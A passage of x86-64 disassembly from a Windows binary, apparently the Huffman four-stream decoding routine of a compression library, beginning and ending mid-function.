   140002cb4:	48 39 74 24 40       	cmp    %rsi,0x40(%rsp)
   140002cb9:	0f 85 29 f2 ff ff    	jne    0x140001ee8
   140002cbf:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002cc4:	48 39 b4 24 80 00 00 	cmp    %rsi,0x80(%rsp)
   140002ccb:	00 
   140002ccc:	0f 85 16 f2 ff ff    	jne    0x140001ee8
   140002cd2:	31 c9                	xor    %ecx,%ecx
   140002cd4:	83 7c 24 70 40       	cmpl   $0x40,0x70(%rsp)
   140002cd9:	0f 94 c1             	sete   %cl
   140002cdc:	21 ca                	and    %ecx,%edx
   140002cde:	85 c2                	test   %eax,%edx
   140002ce0:	0f 84 02 f2 ff ff    	je     0x140001ee8
   140002ce6:	41 83 f9 40          	cmp    $0x40,%r9d
   140002cea:	0f 85 f8 f1 ff ff    	jne    0x140001ee8
   140002cf0:	48 8b 94 24 f8 00 00 	mov    0xf8(%rsp),%rdx
   140002cf7:	00 
   140002cf8:	e9 f2 f1 ff ff       	jmp    0x140001eef
   140002cfd:	0f 1f 00             	nopl   (%rax)
   140002d00:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002d05:	e9 4c f4 ff ff       	jmp    0x140002156
   140002d0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002d10:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002d15:	e9 67 f4 ff ff       	jmp    0x140002181
   140002d1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002d20:	4c 8d 1d d9 f3 01 00 	lea    0x1f3d9(%rip),%r11        # 0x140022100
   140002d27:	44 0f b6 23          	movzbl (%rbx),%r12d
   140002d2b:	49 63 0c 93          	movslq (%r11,%rdx,4),%rcx
   140002d2f:	4c 01 d9             	add    %r11,%rcx
   140002d32:	ff e1                	jmp    *%rcx
   140002d34:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d3b:	00 
   140002d3c:	0f b6 4b 06          	movzbl 0x6(%rbx),%ecx
   140002d40:	48 c1 e1 30          	shl    $0x30,%rcx
   140002d44:	49 01 cc             	add    %rcx,%r12
   140002d47:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d4e:	00 
   140002d4f:	0f b6 4b 05          	movzbl 0x5(%rbx),%ecx
   140002d53:	48 c1 e1 28          	shl    $0x28,%rcx
   140002d57:	49 01 cc             	add    %rcx,%r12
   140002d5a:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d61:	00 
   140002d62:	0f b6 4b 04          	movzbl 0x4(%rbx),%ecx
   140002d66:	48 c1 e1 20          	shl    $0x20,%rcx
   140002d6a:	49 01 cc             	add    %rcx,%r12
   140002d6d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d74:	00 
   140002d75:	0f b6 4b 03          	movzbl 0x3(%rbx),%ecx
   140002d79:	48 c1 e1 18          	shl    $0x18,%rcx
   140002d7d:	49 01 cc             	add    %rcx,%r12
   140002d80:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d87:	00 
   140002d88:	0f b6 4b 02          	movzbl 0x2(%rbx),%ecx
   140002d8c:	48 c1 e1 10          	shl    $0x10,%rcx
   140002d90:	49 01 cc             	add    %rcx,%r12
   140002d93:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d9a:	00 
   140002d9b:	0f b6 4b 01          	movzbl 0x1(%rbx),%ecx
   140002d9f:	48 c1 e1 08          	shl    $0x8,%rcx
   140002da3:	49 01 cc             	add    %rcx,%r12
   140002da6:	45 84 c9             	test   %r9b,%r9b
   140002da9:	0f 84 39 f1 ff ff    	je     0x140001ee8
   140002daf:	41 0f b6 c9          	movzbl %r9b,%ecx
   140002db3:	41 b9 09 00 00 00    	mov    $0x9,%r9d
   140002db9:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002dc0:	00 
   140002dc1:	0f bd c9             	bsr    %ecx,%ecx
   140002dc4:	41 29 d1             	sub    %edx,%r9d
   140002dc7:	41 c1 e1 03          	shl    $0x3,%r9d
   140002dcb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002dd0:	41 29 c9             	sub    %ecx,%r9d
   140002dd3:	e9 71 f2 ff ff       	jmp    0x140002049
   140002dd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002ddf:	00 
   140002de0:	4d 89 ce             	mov    %r9,%r14
   140002de3:	44 8b 0c 24          	mov    (%rsp),%r9d
   140002de7:	4c 89 f1             	mov    %r14,%rcx
   140002dea:	4c 29 c1             	sub    %r8,%rcx
   140002ded:	41 89 c8             	mov    %ecx,%r8d
   140002df0:	c1 e1 03             	shl    $0x3,%ecx
   140002df3:	4d 29 c6             	sub    %r8,%r14
   140002df6:	41 29 cd             	sub    %ecx,%r13d
   140002df9:	4c 89 74 24 08       	mov    %r14,0x8(%rsp)
   140002dfe:	4d 8b 16             	mov    (%r14),%r10
   140002e01:	e9 c3 f9 ff ff       	jmp    0x1400027c9
   140002e06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002e0d:	00 00 00 
   140002e10:	4c 89 d0             	mov    %r10,%rax
   140002e13:	4c 89 d7             	mov    %r10,%rdi
   140002e16:	48 29 c8             	sub    %rcx,%rax
   140002e19:	89 c1                	mov    %eax,%ecx
   140002e1b:	c1 e0 03             	shl    $0x3,%eax
   140002e1e:	48 29 cf             	sub    %rcx,%rdi
   140002e21:	41 29 c7             	sub    %eax,%r15d
   140002e24:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140002e29:	48 8b 3f             	mov    (%rdi),%rdi
   140002e2c:	e9 1c fb ff ff       	jmp    0x14000294d
   140002e31:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002e38:	89 c3                	mov    %eax,%ebx
   140002e3a:	48 89 f8             	mov    %rdi,%rax
   140002e3d:	4c 29 d0             	sub    %r10,%rax
   140002e40:	89 c1                	mov    %eax,%ecx
   140002e42:	c1 e0 03             	shl    $0x3,%eax
   140002e45:	48 29 cf             	sub    %rcx,%rdi
   140002e48:	29 c3                	sub    %eax,%ebx
   140002e4a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140002e4f:	48 8b 2f             	mov    (%rdi),%rbp
   140002e52:	89 5c 24 70          	mov    %ebx,0x70(%rsp)
   140002e56:	e9 6e fc ff ff       	jmp    0x140002ac9
   140002e5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e60:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002e67:	00 
   140002e68:	4c 89 d0             	mov    %r10,%rax
   140002e6b:	48 29 d8             	sub    %rbx,%rax
   140002e6e:	89 c1                	mov    %eax,%ecx
   140002e70:	c1 e0 03             	shl    $0x3,%eax
   140002e73:	49 29 ca             	sub    %rcx,%r10
   140002e76:	41 29 c1             	sub    %eax,%r9d
   140002e79:	4c 89 54 24 38       	mov    %r10,0x38(%rsp)
   140002e7e:	4d 8b 22             	mov    (%r10),%r12
   140002e81:	e9 bf fd ff ff       	jmp    0x140002c45
   140002e86:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140002e8b:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   140002e92:	00 
   140002e93:	48 39 de             	cmp    %rbx,%rsi
   140002e96:	41 0f 92 c0          	setb   %r8b
   140002e9a:	48 39 c3             	cmp    %rax,%rbx
   140002e9d:	0f 92 c1             	setb   %cl
   140002ea0:	44 08 c1             	or     %r8b,%cl
   140002ea3:	0f 85 3f f0 ff ff    	jne    0x140001ee8
   140002ea9:	4c 8b 9c 24 90 00 00 	mov    0x90(%rsp),%r11
   140002eb0:	00 
   140002eb1:	49 39 f3             	cmp    %rsi,%r11
   140002eb4:	0f 82 2e f0 ff ff    	jb     0x140001ee8
   140002eba:	e9 c6 f7 ff ff       	jmp    0x140002685
   140002ebf:	31 c0                	xor    %eax,%eax
   140002ec1:	41 83 ff 40          	cmp    $0x40,%r15d
   140002ec5:	0f 94 c0             	sete   %al
   140002ec8:	e9 e2 fd ff ff       	jmp    0x140002caf
   140002ecd:	31 d2                	xor    %edx,%edx
   140002ecf:	41 83 fd 40          	cmp    $0x40,%r13d
   140002ed3:	0f 94 c2             	sete   %dl
   140002ed6:	e9 c2 fd ff ff       	jmp    0x140002c9d
   140002edb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ee0:	41 57                	push   %r15
   140002ee2:	41 56                	push   %r14
   140002ee4:	41 55                	push   %r13
   140002ee6:	41 54                	push   %r12
   140002ee8:	55                   	push   %rbp
   140002ee9:	57                   	push   %rdi
   140002eea:	56                   	push   %rsi
   140002eeb:	53                   	push   %rbx
   140002eec:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   140002ef3:	48 89 94 24 f8 00 00 	mov    %rdx,0xf8(%rsp)
   140002efa:	00 
   140002efb:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   140002f02:	49 83 f9 09          	cmp    $0x9,%r9
   140002f06:	76 34                	jbe    0x140002f3c
   140002f08:	45 0f b7 20          	movzwl (%r8),%r12d
   140002f0c:	41 0f b7 78 02       	movzwl 0x2(%r8),%edi
   140002f11:	4c 89 ce             	mov    %r9,%rsi
   140002f14:	45 0f b7 58 04       	movzwl 0x4(%r8),%r11d
   140002f19:	49 8d 04 3c          	lea    (%r12,%rdi,1),%rax
   140002f1d:	4d 89 e5             	mov    %r12,%r13
   140002f20:	48 89 fd             	mov    %rdi,%rbp
   140002f23:	48 29 c6             	sub    %rax,%rsi
   140002f26:	4d 89 da             	mov    %r11,%r10
   140002f29:	4c 29 de             	sub    %r11,%rsi
   140002f2c:	48 8d 56 fa          	lea    -0x6(%rsi),%rdx
   140002f30:	49 39 d1             	cmp    %rdx,%r9
   140002f33:	73 23                	jae    0x140002f58
   140002f35:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   140002f3c:	48 89 d0             	mov    %rdx,%rax
   140002f3f:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   140002f46:	5b                   	pop    %rbx
   140002f47:	5e                   	pop    %rsi
   140002f48:	5f                   	pop    %rdi
   140002f49:	5d                   	pop    %rbp
   140002f4a:	41 5c                	pop    %r12
   140002f4c:	41 5d                	pop    %r13
   140002f4e:	41 5e                	pop    %r14
   140002f50:	41 5f                	pop    %r15
   140002f52:	c3                   	ret
   140002f53:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f58:	4d 85 e4             	test   %r12,%r12
   140002f5b:	0f 84 5f 05 00 00    	je     0x1400034c0
   140002f61:	49 8d 58 06          	lea    0x6(%r8),%rbx
   140002f65:	43 0f b6 44 20 05    	movzbl 0x5(%r8,%r12,1),%eax
   140002f6b:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002f70:	49 83 fc 07          	cmp    $0x7,%r12
   140002f74:	0f 86 ae 04 00 00    	jbe    0x140003428
   140002f7a:	4a 8d 5c 23 f8       	lea    -0x8(%rbx,%r12,1),%rbx
   140002f7f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002f84:	84 c0                	test   %al,%al
   140002f86:	0f 84 04 06 00 00    	je     0x140003590
   140002f8c:	44 0f bd c8          	bsr    %eax,%r9d
   140002f90:	48 8b 1b             	mov    (%rbx),%rbx
   140002f93:	b8 08 00 00 00       	mov    $0x8,%eax
   140002f98:	44 29 c8             	sub    %r9d,%eax
   140002f9b:	48 85 ff             	test   %rdi,%rdi
   140002f9e:	0f 84 1c 05 00 00    	je     0x1400034c0
   140002fa4:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140002fa9:	4d 01 e7             	add    %r12,%r15
   140002fac:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140002fb1:	45 0f b6 4c 3f ff    	movzbl -0x1(%r15,%rdi,1),%r9d
   140002fb7:	48 83 ff 07          	cmp    $0x7,%rdi
   140002fbb:	0f 86 0f 05 00 00    	jbe    0x1400034d0
   140002fc1:	4d 8d 7c 3f f8       	lea    -0x8(%r15,%rdi,1),%r15
   140002fc6:	4c 89 7c 24 08       	mov    %r15,0x8(%rsp)
   140002fcb:	45 84 c9             	test   %r9b,%r9b
   140002fce:	0f 84 bc 05 00 00    	je     0x140003590
   140002fd4:	41 0f bd e9          	bsr    %r9d,%ebp
   140002fd8:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140002fde:	4d 8b 27             	mov    (%r15),%r12
   140002fe1:	41 29 e9             	sub    %ebp,%r9d
   140002fe4:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   140002fe9:	4d 85 db             	test   %r11,%r11
   140002fec:	0f 84 ce 04 00 00    	je     0x1400034c0
   140002ff2:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140002ff7:	4d 8d 3c 3e          	lea    (%r14,%rdi,1),%r15
   140002ffb:	43 0f b6 7c 1f ff    	movzbl -0x1(%r15,%r11,1),%edi
   140003001:	49 83 fb 07          	cmp    $0x7,%r11
   140003005:	0f 86 95 05 00 00    	jbe    0x1400035a0
   14000300b:	4f 8d 74 1f f8       	lea    -0x8(%r15,%r11,1),%r14
   140003010:	4c 89 74 24 10       	mov    %r14,0x10(%rsp)
   140003015:	40 84 ff             	test   %dil,%dil
   140003018:	0f 84 72 05 00 00    	je     0x140003590
   14000301e:	0f bd ff             	bsr    %edi,%edi
   140003021:	41 ba 08 00 00 00    	mov    $0x8,%r10d
   140003027:	4d 8b 36             	mov    (%r14),%r14
   14000302a:	41 29 fa             	sub    %edi,%r10d
   14000302d:	48 85 d2             	test   %rdx,%rdx
   140003030:	0f 84 8a 04 00 00    	je     0x1400034c0
   140003036:	4b 8d 3c 1f          	lea    (%r15,%r11,1),%rdi
   14000303a:	4c 8d 5f 08          	lea    0x8(%rdi),%r11
   14000303e:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140003043:	4c 89 5c 24 50       	mov    %r11,0x50(%rsp)
   140003048:	44 0f b6 5c 37 f9    	movzbl -0x7(%rdi,%rsi,1),%r11d
   14000304e:	48 83 fa 07          	cmp    $0x7,%rdx
   140003052:	0f 86 80 0c 00 00    	jbe    0x140003cd8
   140003058:	45 84 db             	test   %r11b,%r11b
   14000305b:	0f 84 2f 05 00 00    	je     0x140003590
   140003061:	41 0f bd fb          	bsr    %r11d,%edi
   140003065:	41 bb 08 00 00 00    	mov    $0x8,%r11d
   14000306b:	41 29 fb             	sub    %edi,%r11d
   14000306e:	48 83 fa 88          	cmp    $0xffffffffffffff88,%rdx
   140003072:	0f 87 c4 fe ff ff    	ja     0x140002f3c
   140003078:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000307d:	48 8d 7c 37 f2       	lea    -0xe(%rdi,%rsi,1),%rdi
   140003082:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003087:	48 8b 3f             	mov    (%rdi),%rdi
   14000308a:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000308f:	48 8b b4 24 10 01 00 	mov    0x110(%rsp),%rsi
   140003096:	00 
   140003097:	49 83 c0 0e          	add    $0xe,%r8
   14000309b:	48 8b bc 24 f8 00 00 	mov    0xf8(%rsp),%rdi
   1400030a2:	00 
   1400030a3:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   1400030a8:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400030ad:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   1400030b1:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   1400030b8:	00 
   1400030b9:	48 01 cf             	add    %rcx,%rdi
   1400030bc:	49 83 c0 08          	add    $0x8,%r8
   1400030c0:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   1400030c7:	00 
   1400030c8:	48 83 ef 03          	sub    $0x3,%rdi
   1400030cc:	48 83 c6 03          	add    $0x3,%rsi
   1400030d0:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   1400030d5:	4d 8d 47 08          	lea    0x8(%r15),%r8
   1400030d9:	48 c1 ee 02          	shr    $0x2,%rsi
   1400030dd:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400030e2:	4c 8d 0c 31          	lea    (%rcx,%rsi,1),%r9
   1400030e6:	4c 89 44 24 58       	mov    %r8,0x58(%rsp)
   1400030eb:	4c 89 4c 24 70       	mov    %r9,0x70(%rsp)
   1400030f0:	49 01 f1             	add    %rsi,%r9
   1400030f3:	4c 01 ce             	add    %r9,%rsi
   1400030f6:	4c 89 8c 24 80 00 00 	mov    %r9,0x80(%rsp)
   1400030fd:	00 
   1400030fe:	4c 8b 8c 24 10 01 00 	mov    0x110(%rsp),%r9
   140003105:	00 
   140003106:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   14000310d:	00 
   14000310e:	45 0f b6 49 02       	movzbl 0x2(%r9),%r9d
   140003113:	44 89 4c 24 6c       	mov    %r9d,0x6c(%rsp)
   140003118:	48 39 fe             	cmp    %rdi,%rsi
   14000311b:	0f 83 18 0d 00 00    	jae    0x140003e39
   140003121:	45 89 c8             	mov    %r9d,%r8d
   140003124:	4c 89 bc 24 98 00 00 	mov    %r15,0x98(%rsp)
   14000312b:	00 
   14000312c:	4d 89 e7             	mov    %r12,%r15
   14000312f:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   140003136:	00 
   140003137:	41 f7 d8             	neg    %r8d
   14000313a:	4c 89 34 24          	mov    %r14,(%rsp)
   14000313e:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140003143:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
   140003148:	41 83 e0 3f          	and    $0x3f,%r8d
   14000314c:	e9 b7 00 00 00       	jmp    0x140003208
   140003151:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003158:	89 c3                	mov    %eax,%ebx
   14000315a:	83 e0 07             	and    $0x7,%eax
   14000315d:	c1 eb 03             	shr    $0x3,%ebx
   140003160:	49 29 dc             	sub    %rbx,%r12
   140003163:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140003168:	49 8b 1c 24          	mov    (%r12),%rbx
   14000316c:	45 31 e4             	xor    %r12d,%r12d
   14000316f:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   140003174:	4c 39 74 24 08       	cmp    %r14,0x8(%rsp)
   140003179:	0f 82 39 0b 00 00    	jb     0x140003cb8
   14000317f:	45 89 cd             	mov    %r9d,%r13d
   140003182:	41 83 e1 07          	and    $0x7,%r9d
   140003186:	41 c1 ed 03          	shr    $0x3,%r13d
   14000318a:	4c 29 6c 24 08       	sub    %r13,0x8(%rsp)
   14000318f:	4c 8b 7c 24 08       	mov    0x8(%rsp),%r15
   140003194:	4d 8b 3f             	mov    (%r15),%r15
   140003197:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   14000319c:	4c 39 74 24 10       	cmp    %r14,0x10(%rsp)
   1400031a1:	0f 82 21 0b 00 00    	jb     0x140003cc8
   1400031a7:	45 89 d5             	mov    %r10d,%r13d
   1400031aa:	41 83 e2 07          	and    $0x7,%r10d
   1400031ae:	41 c1 ed 03          	shr    $0x3,%r13d
   1400031b2:	4c 29 6c 24 10       	sub    %r13,0x10(%rsp)
   1400031b7:	4c 8b 74 24 10       	mov    0x10(%rsp),%r14
   1400031bc:	4d 8b 36             	mov    (%r14),%r14
   1400031bf:	4c 89 34 24          	mov    %r14,(%rsp)
   1400031c3:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400031c8:	4c 39 74 24 18       	cmp    %r14,0x18(%rsp)
   1400031cd:	0f 82 65 04 00 00    	jb     0x140003638
   1400031d3:	45 89 dd             	mov    %r11d,%r13d
   1400031d6:	41 83 e3 07          	and    $0x7,%r11d
   1400031da:	41 c1 ed 03          	shr    $0x3,%r13d
   1400031de:	4c 29 6c 24 18       	sub    %r13,0x18(%rsp)
   1400031e3:	4c 8b 6c 24 18       	mov    0x18(%rsp),%r13
   1400031e8:	4d 8b 75 00          	mov    0x0(%r13),%r14
   1400031ec:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400031f1:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
   1400031f6:	4c 39 f6             	cmp    %r14,%rsi
   1400031f9:	0f 83 39 04 00 00    	jae    0x140003638
   1400031ff:	45 85 e4             	test   %r12d,%r12d
   140003202:	0f 85 30 04 00 00    	jne    0x140003638
   140003208:	c4 62 f9 f7 e3       	shlx   %rax,%rbx,%r12
   14000320d:	c4 42 bb f7 e4       	shrx   %r8,%r12,%r12
   140003212:	4e 8d 2c 62          	lea    (%rdx,%r12,2),%r13
   140003216:	48 83 c1 04          	add    $0x4,%rcx
   14000321a:	45 0f b6 65 00       	movzbl 0x0(%r13),%r12d
   14000321f:	48 83 c7 04          	add    $0x4,%rdi
   140003223:	48 83 c5 04          	add    $0x4,%rbp
   140003227:	48 83 c6 04          	add    $0x4,%rsi
   14000322b:	45 0f b6 6d 01       	movzbl 0x1(%r13),%r13d
   140003230:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140003235:	44 88 61 fc          	mov    %r12b,-0x4(%rcx)
   140003239:	41 01 c5             	add    %eax,%r13d
   14000323c:	c4 c2 b1 f7 c7       	shlx   %r9,%r15,%rax
   140003241:	c4 e2 bb f7 c0       	shrx   %r8,%rax,%rax
   140003246:	4c 8d 24 42          	lea    (%rdx,%rax,2),%r12
   14000324a:	41 0f b6 04 24       	movzbl (%r12),%eax
   14000324f:	45 0f b6 64 24 01    	movzbl 0x1(%r12),%r12d
   140003255:	88 47 fc             	mov    %al,-0x4(%rdi)
   140003258:	c4 e2 a9 f7 04 24    	shlx   %r10,(%rsp),%rax
   14000325e:	c4 e2 bb f7 c0       	shrx   %r8,%rax,%rax
   140003263:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140003267:	45 01 cc             	add    %r9d,%r12d
   14000326a:	44 0f b6 08          	movzbl (%rax),%r9d
   14000326e:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140003272:	44 88 4d fc          	mov    %r9b,-0x4(%rbp)
   140003276:	c4 42 a1 f7 ce       	shlx   %r11,%r14,%r9
   14000327b:	c4 42 bb f7 c9       	shrx   %r8,%r9,%r9
   140003280:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   140003284:	44 01 d0             	add    %r10d,%eax
   140003287:	45 0f b6 11          	movzbl (%r9),%r10d
   14000328b:	45 0f b6 49 01       	movzbl 0x1(%r9),%r9d
   140003290:	44 88 56 fc          	mov    %r10b,-0x4(%rsi)
   140003294:	c4 62 91 f7 d3       	shlx   %r13,%rbx,%r10
   140003299:	c4 42 bb f7 d2       	shrx   %r8,%r10,%r10
   14000329e:	4e 8d 14 52          	lea    (%rdx,%r10,2),%r10
   1400032a2:	45 01 d9             	add    %r11d,%r9d
   1400032a5:	45 0f b6 1a          	movzbl (%r10),%r11d
   1400032a9:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   1400032ae:	44 88 59 fd          	mov    %r11b,-0x3(%rcx)
   1400032b2:	c4 42 99 f7 df       	shlx   %r12,%r15,%r11
   1400032b7:	c4 42 bb f7 db       	shrx   %r8,%r11,%r11
   1400032bc:	4e 8d 1c 5a          	lea    (%rdx,%r11,2),%r11
   1400032c0:	45 01 ea             	add    %r13d,%r10d
   1400032c3:	45 0f b6 2b          	movzbl (%r11),%r13d
   1400032c7:	45 0f b6 5b 01       	movzbl 0x1(%r11),%r11d
   1400032cc:	45 01 e3             	add    %r12d,%r11d
   1400032cf:	c4 62 f9 f7 24 24    	shlx   %rax,(%rsp),%r12
   1400032d5:	c4 42 bb f7 e4       	shrx   %r8,%r12,%r12
   1400032da:	4e 8d 24 62          	lea    (%rdx,%r12,2),%r12
   1400032de:	44 88 6f fd          	mov    %r13b,-0x3(%rdi)
   1400032e2:	45 0f b6 2c 24       	movzbl (%r12),%r13d
   1400032e7:	45 0f b6 64 24 01    	movzbl 0x1(%r12),%r12d
   1400032ed:	44 88 6d fd          	mov    %r13b,-0x3(%rbp)
   1400032f1:	41 01 c4             	add    %eax,%r12d
   1400032f4:	c4 c2 b1 f7 c6       	shlx   %r9,%r14,%rax
   1400032f9:	c4 e2 bb f7 c0       	shrx   %r8,%rax,%rax
   1400032fe:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140003302:	44 0f b6 28          	movzbl (%rax),%r13d
   140003306:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   14000330a:	44 01 c8             	add    %r9d,%eax
   14000330d:	c4 62 a9 f7 cb       	shlx   %r10,%rbx,%r9
   140003312:	c4 42 bb f7 c9       	shrx   %r8,%r9,%r9
   140003317:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   14000331b:	44 88 6e fd          	mov    %r13b,-0x3(%rsi)
   14000331f:	45 0f b6 29          	movzbl (%r9),%r13d
   140003323:	45 0f b6 49 01       	movzbl 0x1(%r9),%r9d
   140003328:	44 88 69 fe          	mov    %r13b,-0x2(%rcx)
   14000332c:	45 01 d1             	add    %r10d,%r9d
   14000332f:	c4 42 a1 f7 d7       	shlx   %r11,%r15,%r10
   140003334:	c4 42 bb f7 d2       	shrx   %r8,%r10,%r10
   140003339:	4e 8d 14 52          	lea    (%rdx,%r10,2),%r10
   14000333d:	45 0f b6 2a          	movzbl (%r10),%r13d
   140003341:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   140003346:	44 88 6f fe          	mov    %r13b,-0x2(%rdi)
   14000334a:	45 01 da             	add    %r11d,%r10d
   14000334d:	c4 62 99 f7 1c 24    	shlx   %r12,(%rsp),%r11
   140003353:	c4 42 bb f7 db       	shrx   %r8,%r11,%r11
   140003358:	4e 8d 1c 5a          	lea    (%rdx,%r11,2),%r11
   14000335c:	45 0f b6 2b          	movzbl (%r11),%r13d
   140003360:	45 0f b6 5b 01       	movzbl 0x1(%r11),%r11d
   140003365:	45 01 e3             	add    %r12d,%r11d
   140003368:	c4 42 f9 f7 e6       	shlx   %rax,%r14,%r12
   14000336d:	c4 42 bb f7 e4       	shrx   %r8,%r12,%r12
   140003372:	4e 8d 24 62          	lea    (%rdx,%r12,2),%r12
   140003376:	44 88 6d fe          	mov    %r13b,-0x2(%rbp)
   14000337a:	45 0f b6 2c 24       	movzbl (%r12),%r13d
   14000337f:	45 0f b6 64 24 01    	movzbl 0x1(%r12),%r12d
   140003385:	44 88 6e fe          	mov    %r13b,-0x2(%rsi)
   140003389:	41 01 c4             	add    %eax,%r12d
   14000338c:	c4 e2 b1 f7 c3       	shlx   %r9,%rbx,%rax
   140003391:	c4 e2 bb f7 c0       	shrx   %r8,%rax,%rax
   140003396:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   14000339a:	44 0f b6 28          	movzbl (%rax),%r13d
   14000339e:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   1400033a2:	44 01 c8             	add    %r9d,%eax
   1400033a5:	c4 42 a9 f7 cf       	shlx   %r10,%r15,%r9
   1400033aa:	c4 42 bb f7 c9       	shrx   %r8,%r9,%r9
   1400033af:	4e 8d 0c 4a          	lea    (%rdx,%r9,2),%r9
   1400033b3:	44 88 69 ff          	mov    %r13b,-0x1(%rcx)
   1400033b7:	45 0f b6 29          	movzbl (%r9),%r13d
   1400033bb:	45 0f b6 49 01       	movzbl 0x1(%r9),%r9d
   1400033c0:	44 88 6f ff          	mov    %r13b,-0x1(%rdi)
   1400033c4:	45 01 d1             	add    %r10d,%r9d
   1400033c7:	c4 62 a1 f7 14 24    	shlx   %r11,(%rsp),%r10
   1400033cd:	c4 42 bb f7 d2       	shrx   %r8,%r10,%r10
   1400033d2:	4e 8d 14 52          	lea    (%rdx,%r10,2),%r10
   1400033d6:	45 0f b6 2a          	movzbl (%r10),%r13d
   1400033da:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   1400033df:	45 01 da             	add    %r11d,%r10d
   1400033e2:	c4 42 99 f7 de       	shlx   %r12,%r14,%r11
   1400033e7:	c4 42 bb f7 db       	shrx   %r8,%r11,%r11
   1400033ec:	4e 8d 1c 5a          	lea    (%rdx,%r11,2),%r11
   1400033f0:	44 88 6d ff          	mov    %r13b,-0x1(%rbp)
   1400033f4:	45 0f b6 2b          	movzbl (%r11),%r13d
   1400033f8:	45 0f b6 5b 01       	movzbl 0x1(%r11),%r11d
   1400033fd:	44 88 6e ff          	mov    %r13b,-0x1(%rsi)
   140003401:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   140003406:	45 01 e3             	add    %r12d,%r11d
   140003409:	4c 8b 64 24 20       	mov    0x20(%rsp),%r12
   14000340e:	4d 39 ec             	cmp    %r13,%r12
   140003411:	0f 83 41 fd ff ff    	jae    0x140003158
   140003417:	41 bc 03 00 00 00    	mov    $0x3,%r12d
   14000341d:	e9 4d fd ff ff       	jmp    0x14000316f
   140003422:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003428:	41 0f b6 58 06       	movzbl 0x6(%r8),%ebx
   14000342d:	66 41 83 fc 07       	cmp    $0x7,%r12w
   140003432:	77 5c                	ja     0x140003490
   140003434:	4c 8d 35 e5 ec 01 00 	lea    0x1ece5(%rip),%r14        # 0x140022120
   14000343b:	4f 63 0c a6          	movslq (%r14,%r12,4),%r9
   14000343f:	4d 01 f1             	add    %r14,%r9
   140003442:	41 ff e1             	jmp    *%r9
   140003445:	0f 1f 00             	nopl   (%rax)
   140003448:	45 0f b6 48 0c       	movzbl 0xc(%r8),%r9d
